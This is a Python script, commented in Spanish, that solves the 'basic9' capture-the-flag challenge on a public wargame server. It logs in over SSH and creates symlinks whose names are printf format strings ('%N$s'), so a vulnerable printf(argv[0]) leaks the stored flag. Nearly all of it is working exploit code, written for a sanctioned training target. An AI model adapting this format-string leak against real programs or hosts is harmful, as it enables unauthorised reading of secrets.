#!/usr/bin/env python3

import pexpect

print("💀 SIMPLE Y DIRECTO 💀")

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

# El programa lee la flag en password[] y luego hace printf(argv[0])
# argv[0] es el nombre del ejecutable
# Si creamos un symlink con % en el nombre, se interpreta como format string

child.sendline(b"cd /tmp")
child.expect([b'\\$'])

print("\n[*] Creando symlinks con format strings...")

# Crear un script bash que haga el trabajo
script = b'''#!/bin/bash
for i in {1..200}; do
    # Crear symlink con format string en el nombre
    ln -sf /home/basic9/basic9 "%$i\$s" 2>/dev/null
    
    # Ejecutar con un argumento
    result=$(./%$i\$s dummy 2>&1)
    
    # Buscar W3C
    if echo "$result" | grep -q "W3C"; then
        echo "[!] FLAG ENCONTRADA en posicion $i:"
        echo "$result" | grep -o "W3C{[^}]*}"
        exit 0
    fi
done
'''

child.sendline(b'cat > find.sh')
child.expect([b'>'])
child.sendline(script)
child.sendline(b'')  # Línea vacía
child.sendcontrol('d')  # EOF
child.expect([b'\\$'])

child.sendline(b'chmod +x find.sh')
child.expect([b'\\$'])

print("[*] Ejecutando búsqueda...")
child.sendline(b'./find.sh')

# Esperar resultado
index = child.expect([b'FLAG ENCONTRADA', b'\\$'], timeout=60)

if index == 0:
    child.expect([b'\\$'], timeout=5)
    output = child.before
    
    try:
        output_str = output.decode('utf-8', errors='ignore')
        print(output_str)
        
        import re
        match = re.search(r'W3C\{[^\}]+\}', output_str)
        if match:
            print(f"\n🔥🔥🔥 FLAG: {match.group(0)} 🔥🔥🔥")
    except:
        pass
else:
    print("[!] No se encontró la flag")

child.close()
print("\n💀 FIN 💀")